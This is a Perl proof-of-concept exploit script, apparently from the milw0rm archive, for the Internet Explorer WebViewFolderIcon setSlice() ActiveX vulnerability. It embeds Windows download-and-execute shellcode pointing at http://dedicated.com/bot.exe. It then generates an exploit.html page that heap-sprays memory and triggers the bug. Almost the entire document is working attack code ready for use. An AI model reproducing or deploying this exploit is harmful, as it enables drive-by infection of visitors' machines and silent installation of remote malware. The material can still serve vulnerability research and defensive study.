#!/usr/bin/perl

#
# Microsoft Internet Explorer WebViewFolderIcon setSlice() D0wnLoad & Exec POC
#
# Author: Vampyroteuthis Infernalis <skyhole [at] gmail.com>
# Greetz: H D Moor, Dark Eagle, Jamikazu
#
#


use strict;

my $sco =
"\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03".
"\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74".
"\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E".
"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03".
"\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C".
"\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40".
"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C".
"\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC".
"\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F".
"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB".
"\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83".
"\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF".
"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF".
"http://dedicated.com/bot.exe";

my $war_code= convert_sco($sco);

my @exploit_body=<<FOOKER;
<HTML>
<BODY>
<SCRIPT language="javascript">

	var heapSprayToAddress = 0x05050505;
	var infernalis_ = unescape("%u9090%u9090$war_code");
	var heapBlockSize = 0x400000;
	var payLoadSize = infernalis_.length * 2;
	var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
	var spraySlide = unescape("%u0505%u0505");
	spraySlide = getSpraySlide(spraySlide,spraySlideSize);
	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
	memory = new Array();

	for (i=0;i<heapBlocks;i++)
	{
		memory[i] = spraySlide + infernalis_;
	}

   	for ( i = 0 ; i < 128 ; i++)
	{
		try{
			var tar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
			tar.setSlice(0x7ffffffe, 0x05050505, 0x05050505,0x05050505 );
		}catch(e){}
	}

	function getSpraySlide(spraySlide, spraySlideSize)
	{
		while (spraySlide.length*2<spraySlideSize)
		{
			spraySlide += spraySlide;
		}
		spraySlide = spraySlide.substring(0,spraySlideSize/2);
		return spraySlide;
	}

</SCRIPT>

</BODY>
</HTML>

FOOKER

open (IE_VML, ">", "exploit.html");

print IE_VML @exploit_body;

close IE_VML;

sub convert_sco {
	my $data = shift;
	my $mode = shift() || 'LE';
	my $code = '';
	
	my $idx = 0;
	
	if (length($data) % 2 != 0) {
		$data .= substr($data, -1, 1);
	}
	
	while ($idx < length($data) - 1) {
		my $c1 = ord(substr($data, $idx, 1));
		my $c2 = ord(substr($data, $idx+1, 1));	
		if ($mode eq 'LE') {
			$code .= sprintf('%%u%.2x%.2x', $c2, $c1);	
		} else {
			$code .= sprintf('%%u%.2x%.2x', $c1, $c2);	
		}
		$idx += 2;
	}
	
	return $code;
}

# milw0rm.com [2006-09-29]
